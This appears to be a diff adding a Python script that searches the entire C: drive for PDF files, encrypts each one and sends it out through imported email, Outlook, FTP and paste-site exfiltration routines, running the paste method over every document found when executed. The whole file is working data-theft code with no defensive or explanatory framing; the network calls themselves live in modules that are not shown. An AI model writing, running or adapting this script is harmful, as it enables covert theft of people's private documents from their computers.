@@ -1,0 +1,47 @@
+import os
+
+from cryptor import decrypt, encrypt  # noqa: F401
+from email_exfil import outlook, plain_email
+from paste_exfil import ie_paste, plain_paste
+from transmit_exfil import plain_ftp, transmit
+
+EXFIL = {
+    "outlook": outlook,
+    "plain_email": plain_email,
+    "plain_ftp": plain_ftp,
+    "transmit": transmit,
+    "ie_paste": ie_paste,
+    "plain_paste": plain_paste,
+}
+
+
+def find_docs(doc_type=".pdf"):
+    for parent, _, filenames in os.walk("c:\\"):
+        for filename in filenames:
+            if filename.endswith(doc_type):
+                document_path = os.path.join(parent, filename)
+                yield document_path
+
+
+def exfiltrate(document_path, method):
+    if method in ["transmit", "plain_ftp"]:
+        filename = f"c:\\windows\\temp\\{os.path.basename(document_path)}"
+        with open(document_path, "rb") as f0:
+            contents = f0.read()
+        with open(filename, "wb") as f1:
+            f1.write(encrypt(contents))
+
+        EXFIL[method](filename)  # ty:ignore[missing-argument]
+        os.unlink(filename)
+    else:
+        with open(document_path, "rb") as f:
+            contents = f.read()
+        title = os.path.basename(document_path)
+        contents = encrypt(contents)
+
+        EXFIL[method](title, contents)  # ty:ignore[too-many-positional-arguments]
+
+
+if __name__ == "__main__":
+    for fpath in find_docs():
+        exfiltrate(fpath, "plain_paste")
